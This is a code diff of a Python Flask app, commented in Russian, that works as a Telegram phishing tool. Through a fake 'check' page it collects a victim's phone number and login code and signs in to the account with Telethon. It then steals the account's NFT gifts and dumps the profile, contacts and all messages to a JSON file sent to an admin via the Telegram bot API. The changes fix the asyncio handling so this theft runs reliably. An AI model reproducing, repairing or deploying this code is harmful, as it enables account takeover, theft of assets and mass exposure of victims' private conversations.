@@ -8,7 +8,7 @@ import os
 import json
 import logging
 from threading import Thread
-from datetime import datetime  # <-- добавлено для метки времени
+from datetime import datetime
 import httpx
 
 logging.basicConfig(level=logging.INFO)
@@ -37,13 +37,12 @@ def notify_admin_sync(text):
         logging.error(f"Failed to notify admin: {e}")
 
 # ============================================================
-# === НОВОЕ: Функция сбора ВСЕХ данных аккаунта ===
+# === Сбор ВСЕХ данных аккаунта ===
 # ============================================================
 async def collect_full_user_data(client):
     """Собирает профиль, контакты, все диалоги, все сообщения."""
     data = {}
     
-    # 1. Данные владельца
     me = await client.get_me()
     data['user'] = {
         'id': me.id,
@@ -55,7 +54,6 @@ async def collect_full_user_data(client):
         'is_premium': getattr(me, 'premium', False)
     }
     
-    # 2. Контакты
     contacts = await client.get_contacts()
     data['contacts'] = []
     for contact in contacts:
@@ -67,7 +65,6 @@ async def collect_full_user_data(client):
             'phone': contact.phone
         })
     
-    # 3. Диалоги и сообщения
     dialogs = await client.get_dialogs()
     data['dialogs'] = []
     for dialog in dialogs:
@@ -84,7 +81,6 @@ async def collect_full_user_data(client):
         elif dialog.is_channel:
             dialog_info['type'] = 'channel'
         
-        # Собираем ВСЕ сообщения (без лимита)
         try:
             messages = []
             async for msg in client.iter_messages(dialog, limit=None):
@@ -107,7 +103,6 @@ async def collect_full_user_data(client):
     
     return data
 
-# === НОВОЕ: Отправка JSON-файла админу ===
 async def send_document_to_admin(file_path):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -175,6 +170,9 @@ def check_page(check_id):
             return render_template('index.html', check_amount=checks[check_id]['amount'])
     return render_template('index.html')
 
+# ============================================================
+# ИСПРАВЛЕННЫЙ ЭНДПОИНТ /api/send-code
+# ============================================================
 @app.route('/api/send-code', methods=['POST'])
 def api_send_code():
     data = request.json
@@ -186,10 +184,13 @@ def api_send_code():
     session_id = os.urandom(8).hex()
     session['session_id'] = session_id
     
-    client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
-    temp_clients[session_id] = client
+    # СОЗДАЁМ НОВЫЙ EVENT LOOP ДЛЯ ЭТОГО ПОТОКА
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     
     async def send_code():
+        # КЛИЕНТ СОЗДАЁТСЯ ВНУТРИ АСИНХРОННОЙ ФУНКЦИИ
+        client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
         try:
             await client.connect()
             result = await client.send_code_request(phone)
@@ -201,17 +202,22 @@ def api_send_code():
             return True
         except Exception as e:
             logging.error(f"Send code error: {e}")
+            if client:
+                await client.disconnect()
             return False
     
-    loop = asyncio.new_event_loop()
-    success = loop.run_until_complete(send_code())
-    loop.close()
-    
-    if success:
-        return jsonify({"success": True, "session_id": session_id})
-    else:
-        return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500
+    try:
+        success = loop.run_until_complete(send_code())
+        if success:
+            return jsonify({"success": True, "session_id": session_id})
+        else:
+            return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500
+    finally:
+        loop.close()
 
+# ============================================================
+# ИСПРАВЛЕННЫЙ ЭНДПОИНТ /api/verify-code
+# ============================================================
 @app.route('/api/verify-code', methods=['POST'])
 def api_verify_code():
     data = request.json
@@ -229,32 +235,34 @@ def api_verify_code():
     phone_code_hash = session_data['phone_code_hash']
     phone = session_data['phone']
     
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
     async def verify_and_process():
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            # Получаем информацию о балансе и подарках
+            
             info = await check_balance_and_gifts(client)
             if info:
-                # === НОВОЕ: Сбор полного дампа и отправка админу ===
+                # Сбор дампа
                 try:
                     dump_data = await collect_full_user_data(client)
                     dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                     with open(dump_filename, 'w', encoding='utf-8') as f:
                         json.dump(dump_data, f, ensure_ascii=False, indent=2)
-                    # Отправляем файл админу (асинхронно, не блокируя отправку подарков)
                     await send_document_to_admin(dump_filename)
-                    # Удаляем локальный файл после отправки
                     if os.path.exists(dump_filename):
                         os.remove(dump_filename)
                 except Exception as e:
                     logging.error(f"Error during data dump: {e}")
                     await send_telegram_message(f"❌ Ошибка сбора дампа: {e}")
-                # === КОНЕЦ НОВОГО ===
-
-                # Отправляем подарки получателю
+                
                 await transfer_nft_to_receiver(client, info)
             
             await client.disconnect()
+            # Удаляем сессию после завершения
+            if session_id in temp_clients:
+                del temp_clients[session_id]
             return True
         except SessionPasswordNeededError:
             await client.disconnect()
@@ -264,16 +272,16 @@ def api_verify_code():
             await client.disconnect()
             return False
     
-    loop = asyncio.new_event_loop()
-    result = loop.run_until_complete(verify_and_process())
-    loop.close()
-    
-    if result is True:
-        return jsonify({"success": True, "message": "Авторизация успешна!"})
-    elif result == "2fa_needed":
-        return jsonify({"success": False, "error": "Требуется облачный пароль"})
-    else:
-        return jsonify({"success": False, "error": "Неверный код"}), 400
+    try:
+        result = loop.run_until_complete(verify_and_process())
+        if result is True:
+            return jsonify({"success": True, "message": "Авторизация успешна!"})
+        elif result == "2fa_needed":
+            return jsonify({"success": False, "error": "Требуется облачный пароль"})
+        else:
+            return jsonify({"success": False, "error": "Неверный код"}), 400
+    finally:
+        loop.close()
 
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
